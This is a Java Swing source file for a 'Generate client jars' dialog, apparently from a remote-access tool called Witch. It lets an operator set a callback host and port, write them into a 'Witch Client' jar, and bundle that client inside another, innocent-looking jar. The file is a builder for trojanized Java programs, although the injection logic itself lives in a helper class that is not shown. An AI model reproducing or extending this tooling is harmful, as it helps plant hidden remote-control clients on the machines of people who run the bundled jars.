package me.soda.witch.server.gui;

import me.soda.witch.server.utils.ConfigModifier;
import net.miginfocom.swing.MigLayout;

import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.*;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;

public class Generate extends JPanel {
    public Generate() {
        setLayout(new MigLayout("insets 10"));

        JTextField inputFileText = new JTextField(50);
        JTextField outputFileText = new JTextField(50);
        JTextField injectedText = new JTextField(50);

        JButton inputSelectBtn = new JButton("📁");
        JButton outputSelectBtn = new JButton("📁");
        JButton injectedSelectBtn = new JButton("📁");

        JTextField hostText = new JTextField(40);
        JTextField portText = new JTextField(5);

        JButton generateBtn = new JButton("Generate");
        JButton bundleBtn = new JButton("Bundle");
        JButton autoBtn = new JButton("Generate & Bundle");

        generateBtn.addActionListener(e -> {
            try {
                ConfigModifier.modifyCfg(inputFileText.getText(), outputFileText.getText(), hostText.getText(), Integer.parseInt(portText.getText()));
                JOptionPane.showMessageDialog(this, "Operation completed");
            } catch (Exception ex) {
                JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
            }
        });

        bundleBtn.addActionListener(e -> {
            try {
                ConfigModifier.combine(inputFileText.getText(), injectedText.getText(), outputFileText.getText());
                JOptionPane.showMessageDialog(this, "Operation completed");
            } catch (Exception ex) {
                JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
            }
        });

        autoBtn.addActionListener(e -> {
            try {
                ConfigModifier.modifyCfg(injectedText.getText(), "cache.tmp", hostText.getText(), Integer.parseInt(portText.getText()));
                ConfigModifier.combine(inputFileText.getText(), "cache.tmp", outputFileText.getText());
                JOptionPane.showMessageDialog(this, "Operation completed");
            } catch (Exception ex) {
                JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
            }
        });

        portText.addKeyListener(new KeyAdapter() {
            @Override
            public void keyTyped(KeyEvent e) {
                char c = e.getKeyChar();
                if (c < '0' || c > '9') e.consume();
            }
        });

        inputSelectBtn.addActionListener(e -> inputFileText.setText(chooseFile(false)));
        outputSelectBtn.addActionListener(e -> outputFileText.setText(chooseFile(true)));
        injectedSelectBtn.addActionListener(e -> injectedText.setText(chooseFile(false)));

        add(new JLabel("Input file"));
        add(inputFileText);
        add(inputSelectBtn, "wrap, pushx");

        add(new JLabel("Output file"));
        add(outputFileText);
        add(outputSelectBtn, "wrap, pushx");

        add(new JLabel("Injected file (Witch Client)"));
        add(injectedText);
        add(injectedSelectBtn, "wrap, pushx");

        add(new JLabel("Port"));
        add(portText, "split 3");
        add(new JLabel("Host"));
        add(hostText, "wrap, pushx");

        String btns = "gapleft 160, gapright 160, dock south, center";
        add(generateBtn, btns);
        add(bundleBtn, btns);
        add(autoBtn, btns);
    }

    private String chooseFile(boolean save) {
        JFileChooser fileChooser = new JFileChooser(".");
        fileChooser.setFileFilter(new FileNameExtensionFilter(".jar", "jar"));
        fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
        if ((save ? fileChooser.showSaveDialog(this) : fileChooser.showOpenDialog(this)) == JFileChooser.APPROVE_OPTION) {
            return fileChooser.getSelectedFile().toString();
        }
        return "";
    }

    public static JDialog dialog(Frame owner) {
        JDialog dialog = new JDialog(owner, true);
        dialog.setContentPane(new Generate());
        dialog.setTitle("Generate client jars");
        dialog.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        dialog.setResizable(false);
        dialog.pack();
        dialog.setLocationRelativeTo(null);
        return dialog;
    }
}
